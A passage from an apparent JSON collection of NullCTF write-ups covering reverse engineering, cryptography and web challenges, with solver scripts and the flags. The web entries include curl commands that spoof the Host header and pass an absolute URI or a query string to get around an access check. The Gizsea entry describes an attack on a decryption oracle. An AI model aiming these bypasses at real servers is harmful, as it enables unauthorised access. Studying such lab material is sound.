                    "memory"
                ],
                "writeup": "<p><strong>Analysis:</strong></p>\n<p>1.  <strong>File Identification:</strong>\n<ul>\n<li><code>file bigLez.exe</code>: Identified as <code>PE32 executable for MS Windows 4.00 (console), Intel i386, 14 sections</code>.</li>\n<li><code>file flag.enc</code>: Identified as <code>data</code>.</li>\n</ul>\n2.  <strong>Initial String Analysis (<code>strings bigLez.exe</code>):</strong>\n<ul>\n<li>Revealed interesting strings like <code>flag.txt</code>, <code>flag.enc</code>, <code>_flagMan</code>, <code>_sassyIV</code>, and API calls like <code>__imp__CryptImportKey@24</code>, <code>__imp__CryptAcquireContextA@20</code>, etc. This suggested Windows CryptoAPI usage for encryption.</li>\n<li>The presence of <code>.sassy</code> as a section name and <code>_sassyIV</code> hinted at an Initialization Vector (IV) being derived from this section.</li>\n</ul>\n3.  <strong>Disassembly with <code>objdump</code>:</strong>                                                             - Disassembled <code>bigLez.exe</code> to <code>disassembly.txt</code> (<code>objdump -d bigLez.exe</code>).                 - <strong><code>_main</code> function (0x401f84):</strong> Calls <code>_intro</code> then <code>_process_magic</code>. This indicates the main flow of the program.\n<ul>\n<li><strong><code>_intro</code> function (0x4017e1):</strong></li>\n<li>Initializes a 32-bit integer at memory address <code>0x409020</code> with the value <code>0x55aa55aa</code>.</li>\n<li>Contains a loop that runs 100 times (for <code>i</code> from 0 to 99). In each iteration, the value at <code>0x409020</code> is updated based on a byte from the <code>_intro</code> function's own machine code. The update logic is: <code>new_key = code_byte[i] ^ (current_key << 5) ^ (current_key >> 3)</code>. The <code>shr</code> instruction implied unsigned 32-bit integer arithmetic.</li>\n<li>Calls <code>_build_stack_strings</code> to populate memory buffers with parts of a quote.            - Prints portions of these strings to the console (observed via <code>wine</code> execution).</li>\n<li><strong><code>_process_magic</code> function (0x401a87):</strong> This is the core encryption logic.</li>\n<li>Calls <code>_build_stack_strings</code> to create three strings on the stack (let's call them Str1, Str2, Str3).</li>\n<li><strong>String Construction:</strong> It dynamically builds a \"magic string\" (let's call it <code>Buffer B</code>) by concatenating specific tokens from Str1, Str2, and Str3. The tokens were selected by index after splitting the original strings using <code>strtok</code> with delimiters \" ,.?!'\".</li>\n<li>Str1: \"hehe, aren't we all chasing the light mate?\"</li>\n<li>Str2: \" Lookin' everywhere to find it,\" (Crucially, this was initially misidentified as \"for mates,\" from static analysis, but dynamic analysis showed \"to find it,\")</li>\n<li>Str3: \" everywhere but within.\"</li>\n<li>The selected tokens in order were: <code>Tokens1[0]</code> (\"hehe\"), <code>Tokens1[5]</code> (\"chasing\"), <code>Tokens1[7]</code> (\"light\"), <code>Tokens2[1]</code> (\"everywhere\"), <code>Tokens2[3]</code> (\"find\"), <code>Tokens3[2]</code> (\"within\").</li>\n<li>Concatenated <code>Buffer B</code>: <code>\"hehechasinglighteverywherefindwithin\"</code></li>\n<li><strong>XORing <code>Buffer B</code>:</strong> <code>Buffer B</code> is then XORed byte-by-byte with the final 32-bit key obtained from <code>_intro</code>, cycling through the 4 bytes of the key (<code>key_byte = key_bytes[i % 4]</code>).</li>\n<li><strong>Hashing:</strong> The XORed <code>Buffer B</code> is then hashed using <code>CryptCreateHash</code> with <code>CALG_SHA_256</code> (0x800c) and <code>CryptHashData</code>. The resulting 32-byte SHA-256 hash forms the <strong>AES key</strong>.</li>\n<li><strong>IV Generation:</strong> An IV is generated from the <code>.sassy</code> section (16 bytes at <code>0x406000</code>). Each byte of <code>.sassy</code> is XORed with a <code>magic_sum</code>. The <code>magic_sum</code> was calculated as the <code>strlen</code> of the full concatenated quote (<code>Str1 + Str2 + Str3</code>).</li>\n<li>Full concatenated quote: \"hehe, aren't we all chasing the light mate? Lookin' everywhere to find it, everywhere but within.\" (Total length 96 bytes).                                 - <code>magic_sum = 96 (0x60)</code>.                                                                  - <code>IV[i] = sassy_bytes[i] ^ 0x60</code>.</li>\n<li><strong>Encryption:</strong> The program uses <code>CryptImportKey</code> (importing a <code>PLAINTEXTKEYBLOB</code> containing the SHA-256 hash as the AES key), <code>CryptSetKeyParam</code> (to set the IV), and <code>CryptEncrypt</code> to encrypt a file (identified as <code>flag.txt</code>). The encrypted data is then written to <code>flag.enc</code>. The <code>dwFlags</code> for <code>CryptEncrypt</code> implies PKCS7 padding.</li>\n</ul>\n                                                                                            <strong>Decryption Strategy:</strong></p>\n<p>The goal is to decrypt <code>flag.enc</code>, which was created by <code>bigLez.exe</code>. Therefore, we need to reverse the encryption process:</p>\n<p>1.  <strong>Calculate the final 32-bit <code>key</code>:</strong> Extract the first 100 bytes of <code>_intro</code>'s code (from <code>bigLez.exe</code> at file offset <code>0xbe1</code> for 100 bytes) and simulate the key generation loop.\n<ul>\n<li>Initial <code>key = 0x55aa55aa</code>.</li>\n<li>For each <code>code_byte</code> from <code>_intro</code>: <code>key = code_byte ^ ((key << 5) & 0xFFFFFFFF) ^ ((key >> 3) & 0xFFFFFFFF)</code>.</li>\n</ul>\n2.  <strong>Determine the \"magic string\" (<code>Buffer B</code>):</strong>\n<ul>\n<li>Str1: \"hehe, aren't we all chasing the light mate?\"</li>\n<li>Str2: \" Lookin' everywhere to find it,\"</li>\n<li>Str3: \" everywhere but within.\"</li>\n<li>Tokens selected: <code>Tokens1[0]</code>, <code>Tokens1[5]</code>, <code>Tokens1[7]</code>, <code>Tokens2[1]</code>, <code>Tokens2[3]</code>, <code>Tokens3[2]</code>.</li>\n<li>Concatenate these tokens.</li>\n</ul>\n3.  <strong>XOR <code>Buffer B</code> with the calculated <code>key</code>:</strong> This produces the <code>XORed Buffer B</code>.\n4.  <strong>Calculate the AES Key:</strong> Compute the SHA-256 hash of <code>XORed Buffer B</code>. This 32-byte hash is the AES key.                                                                          5.  <strong>Calculate the IV:</strong>                                                                       - Get the 16 bytes from the <code>.sassy</code> section of <code>bigLez.exe</code> (at VMA <code>0x406000</code>).           - Calculate <code>magic_sum = strlen(Str1 + Str2 + Str3)</code> (which is 96).                         - XOR each byte of the <code>.sassy</code> section with <code>0x60</code> (<code>magic_sum & 0xFF</code>) to get the 16-byte IV.\n5.  <strong>Decrypt <code>flag.enc</code>:</strong> Use AES-256 in CBC mode with the calculated AES key, IV, and PKCS7 unpadding.\n                                                                                            <strong>Implementation (Python Script):</strong></p>\n<p>A Python script (<code>solve.py</code>) was developed to implement the above steps.\nThe script reads the <code>_intro</code> code bytes and <code>flag.enc</code> directly. It performs the key derivation, magic string construction, XORing, hashing, and IV calculation. Finally, it uses <code>PyCryptodome</code> to decrypt <code>flag.enc</code>.</p>\n<p><strong>Final Flag:</strong>\n<code>NULLCTF{7H1S_1S_A_N1C3_PL4C3_M8}</code></p>\n"
            },
            {
                "id": "classically",
                "title": "Classically",
                "category": "Cryptography",
                "tags": [
                    "cipher",
                    "http",
                    "image"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>We are provided with three files:</p>\n<p>1. <code>main.py</code>: The encryption script.</p>\n<p>2. <code>M.py</code>: A file containing a large 64x64 integer matrix.</p>\n<p>3. <code>flag.txt</code>: (Which we need to recover).</p>\n<h3>Analysis</h3>\n<p>Examining <code>main.py</code>, we see that the script reads a flag and asserts that its length is 64 bytes. It defines a modulus <code>mod = 0x10001</code> (65537).</p>\n<p>The core logic iterates through the matrix <code>M</code> and performs the following operation:</p>\n<p>Python</p>\n<pre><code class=\"\">for i in range(n):\n    dot = 0\n    for j in range(n):\n        dot += M[i][j] * flag[j]\n    result.append(dot % mod)\n</code></pre>\n<p>This loop represents a classic <strong>Matrix Multiplication</strong> over a finite field. The operation can be described mathematically as:</p>\n<p>M\u00d7f<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"0.471em\"%20height=\"0.714em\"%20style=\"width:0.471em\"%20viewBox=\"0%200%20471%20714\"%20preserveAspectRatio=\"xMinYMin\"><path%20d=\"M377%2020c0-5.333%201.833-10%205.5-14S391%200%20397%200c4.667%200%208.667%201.667%2012%2053.333%202.667%206.667%209%2010%2019%206.667%2024.667%2020.333%2043.667%2041%2057%207.333%204.667%201110.667%2011%2018%200%206-1%2010-3%2012s-6.667%205-14%209c-28.667%2014.667-53.667%2035.667-75%2063-1.333%201.333-3.167%203.5-5.5%206.5s-4%204.833-5%205.5c-1%20.667-2.5%201.333-4.5%202s-4.333%201-7%201c-4.667%200-9.167-1.833-13.5-5.5S337%20184%20337%20178c0-12.667%2015.667-32.333%2047-59H213l-171-1c-8.667-6-13-12.333-13-19%200-4.667%204.333-11.333%2013-20h359c-16-25.333-24-45-24-59z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\">\u200b\u2261r<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"0.471em\"%20height=\"0.714em\"%20style=\"width:0.471em\"%20viewBox=\"0%200%20471%20714\"%20preserveAspectRatio=\"xMinYMin\"><path%20d=\"M377%2020c0-5.333%201.833-10%205.5-14S391%200%20397%200c4.667%200%208.667%201.667%2012%2053.333%202.667%206.667%209%2010%2019%206.667%2024.667%2020.333%2043.667%2041%2057%207.333%204.667%201110.667%2011%2018%200%206-1%2010-3%2012s-6.667%205-14%209c-28.667%2014.667-53.667%2035.667-75%2063-1.333%201.333-3.167%203.5-5.5%206.5s-4%204.833-5%205.5c-1%20.667-2.5%201.333-4.5%202s-4.333%201-7%201c-4.667%200-9.167-1.833-13.5-5.5S337%20184%20337%20178c0-12.667%2015.667-32.333%2047-59H213l-171-1c-8.667-6-13-12.333-13-19%200-4.667%204.333-11.333%2013-20h359c-16-25.333-24-45-24-59z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\">(modP)</p>\n<p>Where:</p>\n<ul>\n<li>M is the known 64\u00d764 matrix from <code>M.py</code>.</li>\n<li>f<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"0.471em\"%20height=\"0.714em\"%20style=\"width:0.471em\"%20viewBox=\"0%200%20471%20714\"%20preserveAspectRatio=\"xMinYMin\"><path%20d=\"M377%2020c0-5.333%201.833-10%205.5-14S391%200%20397%200c4.667%200%208.667%201.667%2012%2053.333%202.667%206.667%209%2010%2019%206.667%2024.667%2020.333%2043.667%2041%2057%207.333%204.667%201110.667%2011%2018%200%206-1%2010-3%2012s-6.667%205-14%209c-28.667%2014.667-53.667%2035.667-75%2063-1.333%201.333-3.167%203.5-5.5%206.5s-4%204.833-5%205.5c-1%20.667-2.5%201.333-4.5%202s-4.333%201-7%201c-4.667%200-9.167-1.833-13.5-5.5S337%20184%20337%20178c0-12.667%2015.667-32.333%2047-59H213l-171-1c-8.667-6-13-12.333-13-19%200-4.667%204.333-11.333%2013-20h359c-16-25.333-24-45-24-59z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\">\u200b is the unknown flag vector (converted to ASCII integers).</li>\n<li>r<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"0.471em\"%20height=\"0.714em\"%20style=\"width:0.471em\"%20viewBox=\"0%200%20471%20714\"%20preserveAspectRatio=\"xMinYMin\"><path%20d=\"M377%2020c0-5.333%201.833-10%205.5-14S391%200%20397%200c4.667%200%208.667%201.667%2012%2053.333%202.667%206.667%209%2010%2019%206.667%2024.667%2020.333%2043.667%2041%2057%207.333%204.667%201110.667%2011%2018%200%206-1%2010-3%2012s-6.667%205-14%209c-28.667%2014.667-53.667%2035.667-75%2063-1.333%201.333-3.167%203.5-5.5%206.5s-4%204.833-5%205.5c-1%20.667-2.5%201.333-4.5%202s-4.333%201-7%201c-4.667%200-9.167-1.833-13.5-5.5S337%20184%20337%20178c0-12.667%2015.667-32.333%2047-59H213l-171-1c-8.667-6-13-12.333-13-19%200-4.667%204.333-11.333%2013-20h359c-16-25.333-24-45-24-59z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\"> is the known <code>result</code> vector provided in the comments of <code>main.py</code>.</li>\n<li>P is <code>65537</code> (0x10001).</li>\n</ul>\n<h3>Solution Strategy</h3>\n<p>Since P=65537 is a prime number, we are working within the finite field F65537\u200b. This implies that the matrix M is likely invertible. To recover the flag f<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"0.471em\"%20height=\"0.714em\"%20style=\"width:0.471em\"%20viewBox=\"0%200%20471%20714\"%20preserveAspectRatio=\"xMinYMin\"><path%20d=\"M377%2020c0-5.333%201.833-10%205.5-14S391%200%20397%200c4.667%200%208.667%201.667%2012%2053.333%202.667%206.667%209%2010%2019%206.667%2024.667%2020.333%2043.667%2041%2057%207.333%204.667%201110.667%2011%2018%200%206-1%2010-3%2012s-6.667%205-14%209c-28.667%2014.667-53.667%2035.667-75%2063-1.333%201.333-3.167%203.5-5.5%206.5s-4%204.833-5%205.5c-1%20.667-2.5%201.333-4.5%202s-4.333%201-7%201c-4.667%200-9.167-1.833-13.5-5.5S337%20184%20337%20178c0-12.667%2015.667-32.333%2047-59H213l-171-1c-8.667-6-13-12.333-13-19%200-4.667%204.333-11.333%2013-20h359c-16-25.333-24-45-24-59z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\">\u200b, we simply need to compute the modular inverse of M and multiply it by the result vector r<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"0.471em\"%20height=\"0.714em\"%20style=\"width:0.471em\"%20viewBox=\"0%200%20471%20714\"%20preserveAspectRatio=\"xMinYMin\"><path%20d=\"M377%2020c0-5.333%201.833-10%205.5-14S391%200%20397%200c4.667%200%208.667%201.667%2012%2053.333%202.667%206.667%209%2010%2019%206.667%2024.667%2020.333%2043.667%2041%2057%207.333%204.667%201110.667%2011%2018%200%206-1%2010-3%2012s-6.667%205-14%209c-28.667%2014.667-53.667%2035.667-75%2063-1.333%201.333-3.167%203.5-5.5%206.5s-4%204.833-5%205.5c-1%20.667-2.5%201.333-4.5%202s-4.333%201-7%201c-4.667%200-9.167-1.833-13.5-5.5S337%20184%20337%20178c0-12.667%2015.667-32.333%2047-59H213l-171-1c-8.667-6-13-12.333-13-19%200-4.667%204.333-11.333%2013-20h359c-16-25.333-24-45-24-59z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\">:</p>\n<p>f<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"0.471em\"%20height=\"0.714em\"%20style=\"width:0.471em\"%20viewBox=\"0%200%20471%20714\"%20preserveAspectRatio=\"xMinYMin\"><path%20d=\"M377%2020c0-5.333%201.833-10%205.5-14S391%200%20397%200c4.667%200%208.667%201.667%2012%2053.333%202.667%206.667%209%2010%2019%206.667%2024.667%2020.333%2043.667%2041%2057%207.333%204.667%201110.667%2011%2018%200%206-1%2010-3%2012s-6.667%205-14%209c-28.667%2014.667-53.667%2035.667-75%2063-1.333%201.333-3.167%203.5-5.5%206.5s-4%204.833-5%205.5c-1%20.667-2.5%201.333-4.5%202s-4.333%201-7%201c-4.667%200-9.167-1.833-13.5-5.5S337%20184%20337%20178c0-12.667%2015.667-32.333%2047-59H213l-171-1c-8.667-6-13-12.333-13-19%200-4.667%204.333-11.333%2013-20h359c-16-25.333-24-45-24-59z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\">\u200b\u2261M\u22121\u00d7r<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"0.471em\"%20height=\"0.714em\"%20style=\"width:0.471em\"%20viewBox=\"0%200%20471%20714\"%20preserveAspectRatio=\"xMinYMin\"><path%20d=\"M377%2020c0-5.333%201.833-10%205.5-14S391%200%20397%200c4.667%200%208.667%201.667%2012%2053.333%202.667%206.667%209%2010%2019%206.667%2024.667%2020.333%2043.667%2041%2057%207.333%204.667%201110.667%2011%2018%200%206-1%2010-3%2012s-6.667%205-14%209c-28.667%2014.667-53.667%2035.667-75%2063-1.333%201.333-3.167%203.5-5.5%206.5s-4%204.833-5%205.5c-1%20.667-2.5%201.333-4.5%202s-4.333%201-7%201c-4.667%200-9.167-1.833-13.5-5.5S337%20184%20337%20178c0-12.667%2015.667-32.333%2047-59H213l-171-1c-8.667-6-13-12.333-13-19%200-4.667%204.333-11.333%2013-20h359c-16-25.333-24-45-24-59z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\">(modP)</p>\n<p>We can automate this linear algebra using Python's <code>sympy</code> library, which supports modular matrix inversion.</p>\n<h3>Solver Script</h3>\n<p>Save this as <code>solve.py</code> in the same directory as <code>M.py</code>.</p>\n<p>Python</p>\n<pre><code class=\"\">from sympy import Matrix\nfrom M import M\n<p>&lt;h2&gt;1. Define the parameters from the challenge&lt;/h2&gt;\nMOD = 0x10001\nCIPHERTEXT = [\n    29839, 662, 50523, 15906, 32667, 25159, 5172, 11685, 5618, 62174, \n    54405, 34902, 12259, 59526, 12299, 37286, 6055, 16813, 42488, 40708, \n    7662, 24263, 24047, 55429, 64420, 18167, 36330, 18325, 61471, 559, \n    32085, 23807, 26543, 26886, 24249, 45980, 23360, 15196, 42894, 33054, \n    22073, 23786, 63308, 44883, 60088, 38633, 54798, 42893, 29049, 25567, \n    33563, 49913, 63714, 51666, 60112, 19656, 13133, 11756, 34277, 55622, \n    14539, 54580, 48536, 1337\n]</p>\n<p>def solve():\n    print(\"[*] Converting to SymPy matrices...\")\n    mat_M = Matrix(M)\n    vec_result = Matrix(CIPHERTEXT)</p>\n<p>print(\"[*] Calculating modular inverse (this may take a moment)...\")\n    try:\n        # SymPy's inv_mod computes the inverse within the finite field\n        mat_M_inv = mat_M.inv_mod(MOD)\n    except ValueError:\n        print(\"[-] Matrix is not invertible!\")\n        return</p>\n<p>print(\"[*] Recovering flag vector...\")\n    # Multiply the inverse matrix by the result vector\n    vec_flag = (mat_M_inv * vec_result) % MOD</p>\n<p># Convert the resulting integers back to ASCII characters\n    flag = \"\".join([chr(int(x)) for x in vec_flag])\n    print(f\"[+] Flag: {flag}\")</p>\n<p>if __name__ == \"__main__\":\n    solve()\n</code></pre></p>\n<h3>Flag:ctf{s0lve_th3_equ4t10n5_t0_f1nd_fl4g_h3r3_w4s_easy_en0ugh_NO???}</h3>\n"
            },
            {
                "id": "codename-neigh-2",
                "title": "Codename Neigh 2",
                "category": "Web Exploitation",
                "tags": [
                    "web",
                    "http"
                ],
                "writeup": "<h3>Challenge Overview</h3>\nWe are given a web application written in Pony, running on a Docker container. The goal is to read the <code>private/flag.html</code> file.\n<h3>Analysis</h3>\nThe source code (<code>app/main.pony</code>) reveals the following routing configuration:\n<pre><code class=\"pony\">    let server =\n      Jennet(tcplauth, env.out)\n        .&gt; serve_file(fileauth, \"/\", \"public/index.html\")\n        .&gt; serve_file(fileauth, \"/pony\", \"public/pony.html\")\n        .&gt; post(\"/pony/find\", PonyFind(fileauth))\n        .&gt; get(\"/flag\", F(fileauth)) // Target handler\n        .&gt; get(\"/:name\", H(fileauth))\n</code></pre>\n<p>The handler <code>F</code> is responsible for serving the flag. Let's examine its <code>apply</code> method:</p>\n<pre><code class=\"pony\">  fun apply(ctx: Context): Context iso^ =&gt;\n    var conn: String = \"\"\n                                                                                                try                                                                                           conn = ctx.request.header(\"Host\") as String\n    end\n                                                                                                let path: String = ctx.request.uri().string()\n    // Vulnerable Check\n    if (conn == \"127.0.0.1\") and not_starts_with(path, \"flag\") and not_starts_with(path, \"/flag\") then                                                                                        let fpath = FilePath(_fileauth, \"private/flag.html\")\n      with file = File(fpath) do\n        body = file.read_string(file.size()).string().array()                                     end\n    end\n    // ...                                                                                  </code></pre>\n<p>The conditions to get the flag are:                                                         1. The <code>Host</code> header must be <code>127.0.0.1</code>.\n2. The request URI (as returned by <code>ctx.request.uri().string()</code>) must <strong>not</strong> start with <code>flag</code>.                                                                                        3. The request URI must <strong>not</strong> start with <code>/flag</code>.</p>\n<p>The vulnerability lies in how <code>ctx.request.uri().string()</code> behaves compared to how the router routes the request.\nIf we send a request with an <strong>absolute URI</strong> (e.g., <code>GET http://target/flag HTTP/1.1</code>), standard HTTP servers (and <code>Jennet</code>/<code>pony-http</code>) route this based on the path component (<code>/flag</code>). However, <code>ctx.request.uri().string()</code> returns the *entire* URI string provided in the request line.</p>\n<p>So, if we send <code>GET http://target/flag</code>, the variable <code>path</code> becomes <code>\"http://target/flag\"</code>.\n<ul>\n<li>Does it start with <code>\"flag\"</code>? No.</li>\n<li>Does it start with <code>\"/flag\"</code>? No.</li>\n</ul>\nThe check passes, and the router still invokes the <code>/flag</code> handler.</p>\n<h3>Exploitation</h3>\nWe can use <code>curl</code> with the <code>--request-target</code> option to force sending the absolute URI in the request line, while manually setting the <code>Host</code> header to satisfy the first condition.\n<p>Command:                                                                                    ``<code>bash                                                                                     curl -v -H \"Host: 127.0.0.1\" --request-target \"http://public.ctf.r0devnull.team:3003/flag\" \"http://public.ctf.r0devnull.team:3003/flag\"\n</code>`<code></p>\n<h3>Flag                                                                                     </code>nullctf{n0w_w!th_99%_l3ss_un1nt3nd3d_s0lv3s_m4yb3!!!@}`</h3>\n"
            },
            {
                "id": "codename-neigh",
                "title": "Codename Neigh",
                "category": "Web Exploitation",
                "tags": [
                    "web",
                    "http"
                ],
                "writeup": "<p>1. Challenge Description:\nThe challenge involved a web application written in Pony, accessible via a provided set of Docker files and source code. The goal was to retrieve a flag from a protected endpoint.</p>\n<p>2. Vulnerability Identified:\nThe core vulnerability was a logic error in the <code>/flag</code> endpoint's access control. The <code>F</code> request handler in <code>app/main.pony</code> was responsible for serving the flag. It had two main checks:\n<ul>\n<li>The <code>Host</code> HTTP header must be <code>127.0.0.1</code>.</li>\n<li>The request URI path (<code>ctx.request.uri().string()</code>) must NOT be exactly <code>\"/flag\"</code> or <code>\"flag\"</code>.</li>\n</ul>\nThe flaw lies in the second condition. While the Jennet web framework routes requests to <code>/flag</code> to this handler, the <code>ctx.request.uri().string()</code> method returns the full URI, including any query parameters. Therefore, a request to <code>/flag?anything</code> would still be routed to the <code>F</code> handler, but the <code>path</code> variable inside the handler would be <code>\"/flag?anything\"</code>, which does not match <code>\"/flag\"</code> or <code>\"flag\"</code>, thus bypassing the intended restriction.</p>\n<p>3. Exploitation Steps:\nTo exploit this, the following steps were taken:\n   a.  <strong>Identify the target:</strong> The remote server URL was <code>http://public.ctf.r0devnull.team:3002/</code>.\n   b.  <strong>Spoof the Host header:</strong> Set the <code>Host</code> header to <code>127.0.0.1</code>.\n   c.  <strong>Bypass path check:</strong> Append a query string to the <code>/flag</code> endpoint (e.g., <code>?x</code>).</p>\n<p>The command used was:\n<code>curl -H \"Host: 127.0.0.1\" \"http://public.ctf.r0devnull.team:3002/flag?x\"</code></p>\n<p>4. Flag:\nThe flag obtained was:\n<code>nullctf{p3rh4ps_my_p0ny_!s_s0mewh3re_3lse_:(</code></p>\n"
            },
            {
                "id": "gizsea",
                "title": "Gizsea",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "aes",
                    "cipher",
                    "xor",
                    "reverse"
                ],
                "writeup": "<h3>Challenge Overview</h3>\nThe challenge provides a server implementing a custom block cipher encryption scheme labeled \"Gizsea\". We are given the source code (<code>server.zig</code>) and the ability to interact with the server via netcat. The server allows us to:\n1. Encrypt arbitrary plaintext (hex).\n2. Decrypt arbitrary ciphertext (hex), with a validation check.\n3. Get the encrypted flag.\n<p>The validation check (<code>isValid</code>) prevents us from decrypting any ciphertext that contains blocks identical to the encrypted flag blocks.</p>\n<h3>Crypto Analysis</h3>\n<h4>Encryption Scheme</h4>\nThe encryption function <code>sch3m3Encrypt</code> uses AES-128 in a custom feedback mode.\nFor a plaintext block $P_i$ and ciphertext block $C_i$:\n<p>$$C_i = \\text{AES\\_DEC}(key, P_i) \\oplus P_{i-1}$$</p>\n<p>Where $P_{-1} = IV$.\nNote that it uses AES <strong>Decryption</strong> primitive for the encryption process.</p>\n<h4>Decryption Scheme</h4>\nThe decryption function <code>sch3m3Decrypt</code> reverses the operation:\n<p>$$P_i = \\text{AES\\_ENC}(key, C_i \\oplus P_{i-1})$$</p>\n<p>This confirms the relationship. If we know $C_i$ and $P_{i-1}$, we can recover $P_i$ by calculating $X = C_i \\oplus P_{i-1}$ and then applying the AES Encryption primitive to $X$.</p>\n<h3>Vulnerability                                                                                                                                                                        The vulnerability stems from the combination of a chosen-plaintext attack (CPA) and a chosen-ciphertext attack (CCA), despite the filter on the decryption oracle.</h3>\n<h4>1. IV Recovery                                                                          Since the IV is generated randomly at startup and reused for the session, we can recover it using the Encryption Oracle.</h4>\nIf we encrypt two blocks of zeros ($P_0 = 0, P_1 = 0$):\n$$C_0 = \\text{AES\\_DEC}(0) \\oplus IV$$\n$$C_1 = \\text{AES\\_DEC}(0) \\oplus P_0 = \\text{AES\\_DEC}(0) \\oplus 0 = \\text{AES\\_DEC}(0)$$\n<p>By XORing them:\n$$C_0 \\oplus C_1 = (\\text{AES\\_DEC}(0) \\oplus IV) \\oplus \\text{AES\\_DEC}(0) = IV$$</p>\n<h4>2. Flag Recovery (Oracle Manipulation)</h4>\nWe have the encrypted flag blocks $C_{flag\\_0}, C_{flag\\_1}, \\dots$.\nWe want to recover $P_{flag\\_0}, P_{flag\\_1}, \\dots$.\n<p>For any block $i$, we know $P_{flag\\_i} = \\text{AES\\_ENC}(C_{flag\\_i} \\oplus P_{flag\\_(i-1)})$.\n(For $i=0$, $P_{flag\\_(-1)} = IV$, which we just recovered).</p>\n<p>We cannot simply ask the decryption oracle to decrypt $C_{flag\\_i}$ because of the <code>isValid</code> check. However, we can construct a <strong>different</strong> ciphertext that results in the same input to the underlying AES primitive.\n                                                                                            We construct a 2-block ciphertext $C'_0 || C'_1$ to send to the decryption oracle:          1.  <strong>Select $C'_0$</strong>: Choose a random 16-byte block that is <strong>not</strong> present in the encrypted flag.\n2.  <strong>Get $P'_0$</strong>: We can query the decryption oracle with just $C'_0$ (or calculate it as part of the chain) to find what it decrypts to.                                                 $$P'_0 = \\text{AES\\_ENC}(C'_0 \\oplus IV)$$\n3.  <strong>Calculate $C'_1$</strong>: We want the second block's decryption to output our target flag block $P_{flag\\_i}$.                                                                              The decryption logic for the second block is:                                               $$P'_1 = \\text{AES\\_ENC}(C'_1 \\oplus P'_0)$$\n    We want $P'_1 = P_{flag\\_i}$, which means inputs to AES must match:\n    $$C'_1 \\oplus P'_0 = C_{flag\\_i} \\oplus P_{flag\\_(i-1)}$$\n    Solving for $C'_1$:\n    $$C'_1 = C_{flag\\_i} \\oplus P_{flag\\_(i-1)} \\oplus P'_0$$</p>\n<p>4.  <strong>Verify</strong>: Check if our calculated $C'_1$ happens to be in the encrypted flag blocks. If it is (collision), pick a new random $C'_0$ and retry.\n5.  <strong>Exploit</strong>: Send $C'_0 || C'_1$ to the decryption oracle. The returned second block of plaintext is the flag block $P_{flag\\_i}$.</p>\n<h3>Solution Script Summary</h3>\n1. Connect to the server.\n2. Retrieve the Encrypted Flag.\n3. Encrypt 32 bytes of zeros to recover the IV.\n4. Iterate through each block of the encrypted flag:\n<ul>\n<li>Generate random $C'_0$.</li>\n<li>Query oracle to get $P'_0$.</li>\n<li>Calculate required $C'_1$.</li>\n<li>Query oracle with $C'_0 || C'_1$ to get the flag block.</li>\n<li>Update $P_{prev}$ for the next iteration.</li>\n</ul>\n5. Print the flag.\n<strong>Flag:</strong> <code>nullctf{z1g_z4g_cr7pt0_fl1p_fl0p}</code>\n"
            },
            {
                "id": "netfilter-nightmare",
                "title": "Netfilter Nightmare",
                "category": "Reverse Engineering",
                "tags": [
                    "xor",
                    "web",
                    "assembly",
                    "binary analysis",
                    "pcap",
                    "shark"
                ],
                "writeup": "<h3>Challenge Overview</h3>\nWe were provided with a binary named <code>nightmare</code> and a packet capture file <code>traffic.pcap</code>. The premise is that the binary \"messed up\" the network traffic, specifically related to web browsing (DNS). The goal is to recover the visited websites/flag from the capture.\n<h3>Analysis</h3>\n<h4>Binary Analysis (<code>nightmare</code>)</h4>\n1.  <strong>Initial Inspection</strong>: Using <code>file</code> and <code>strings</code>, we identified it as a 64-bit ELF executable dynamically linked with <code>libnetfilter_queue</code>. This library allows userspace programs to handle packets queued by the kernel packet filter.\n2.  <strong>Disassembly</strong>: Disassembling the binary revealed the main loop handling packets.\n<ul>\n<li>It binds to a netfilter queue.</li>\n<li>It processes UDP packets (specifically checking for port 53/DNS structure).</li>\n<li>It iterates through the DNS query name.</li>\n</ul>\n3.  <strong>Obfuscation Logic</strong>: The assembly logic showed an XOR operation being applied to the payload.\n<ul>\n<li>The key for the XOR operation is 4 bytes long.</li>\n<li>The key is derived dynamically from the packet headers:</li>\n<li>Byte 0: UDP Source Port (Lower 8 bits)</li>\n<li>Byte 1: UDP Source Port (Upper 8 bits)</li>\n<li>Byte 2: DNS Transaction ID (Lower 8 bits)</li>\n<li>Byte 3: DNS Transaction ID (Upper 8 bits)</li>\n<li>The obfuscation is symmetric (XOR), so applying the same operation decrypts the data.</li>\n</ul>\n<h4>PCAP Analysis (<code>traffic.pcap</code>)</h4>\nThe pcap file contained DNS traffic with unintelligible query names (e.g., hex strings or garbage characters). However, the UDP and DNS headers (Source Port and Transaction ID) were intact.\n<h3>Solution</h3>\n<p>To recover the original domains, we wrote a script to:\n1.  Parse <code>traffic.pcap</code> using <code>tshark</code>.\n2.  Extract the <strong>UDP Source Port</strong>, <strong>DNS Transaction ID</strong>, and the <strong>Obfuscated Query Name</strong> for each DNS packet.\n3.  Reconstruct the 4-byte XOR key for each packet: <code>[SrcPort_Lo, SrcPort_Hi, TransID_Lo, TransID_Hi]</code>.\n4.  XOR the bytes of the obfuscated query name with this key.</p>\n<h4>Decrypted Output</h4>\nRunning the decryption script revealed several standard domains (google.com, github.com, etc.) and a series of specific domains that formed the flag:\n<p>1.  <code>nullctf{dns_.ro</code>\n2.  